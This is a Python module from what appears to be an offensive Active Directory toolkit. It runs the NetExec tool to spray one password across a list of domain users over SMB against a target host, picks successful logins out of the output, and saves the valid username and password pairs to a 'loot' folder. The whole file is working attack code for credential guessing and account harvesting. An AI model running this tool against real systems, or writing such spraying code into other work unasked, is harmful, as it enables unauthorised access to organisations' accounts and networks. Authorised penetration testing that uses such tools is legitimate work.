# modules/password_spray.py

import os
import shutil
import subprocess
import re
from datetime import datetime
from core.colors import red, green, yellow, blue
from core.helpers import save_loot

def attack_password_spray(session):
    print(blue("[*] Starting Password Spray with NXC..."))

    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH. Please install it."))
        return

    userfile = "loot/valid_users.txt"
    if not os.path.exists(userfile):
        print(yellow("[!] valid_users.txt not found."))
        alt = input("[?] Enter path to user list file: ").strip()
        if not os.path.exists(alt):
            print(red("[-] Alternate user list not found."))
            return
        userfile = alt

    with open(userfile, "r") as f:
        users = [line.strip() for line in f if line.strip()]
    if not users:
        print(red("[-] No users found in list."))
        return

    password = input("[?] Enter password to spray: ").strip()
    if not password:
        print(red("[-] No password provided. Aborting."))
        return

    # Prepare
    temp_userfile = "loot/spray_users.txt"
    with open(temp_userfile, "w") as f:
        f.writelines([u + "\n" for u in users])

    timestamp = datetime.now().strftime("%Y%m%d-%H%M")
    spray_log_file = f"loot/spray_raw_{timestamp}.txt"
    valid_file = f"loot/spray_valid_{timestamp}.txt"

    print(blue(f"[*] Spraying {len(users)} users with password: {password}"))

    cmd = [
        "nxc", "smb", session.target_ip,
        "-d", session.domain,
        "-u", temp_userfile,
        "-p", password,
        "--no-bruteforce",
        "--continue-on-success"
    ]

    valid_lines = []

    try:
        with open(spray_log_file, "w") as log_file:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            for line in proc.stdout:
                line = line.strip()
                print(line)
                log_file.write(line + "\n")

                # Match: [+] domain\user:password
                if "[+]" in line and "STATUS_LOGON_FAILURE" not in line:
                    match = re.search(
                        rf"{re.escape(session.domain)}\\([^\s:]+):{re.escape(password)}",
                        line, re.IGNORECASE
                    )
                    if match:
                        user = match.group(1)
                        creds = f"{user}:{password}"
                        print(green(f"[VALID] {creds}"))
                        valid_lines.append(creds)

        if valid_lines:
            save_loot(os.path.basename(valid_file), "\n".join(valid_lines))
            print(green(f"[+] Valid credentials saved to {valid_file}"))
        else:
            print(yellow("[*] No valid credentials detected."))

        print(yellow(f"[*] Full spray output saved to {spray_log_file}"))

    except KeyboardInterrupt:
        print(red("\n[!] Spray interrupted by user."))
    except Exception as e:
        print(red(f"[!] Error: {e}"))
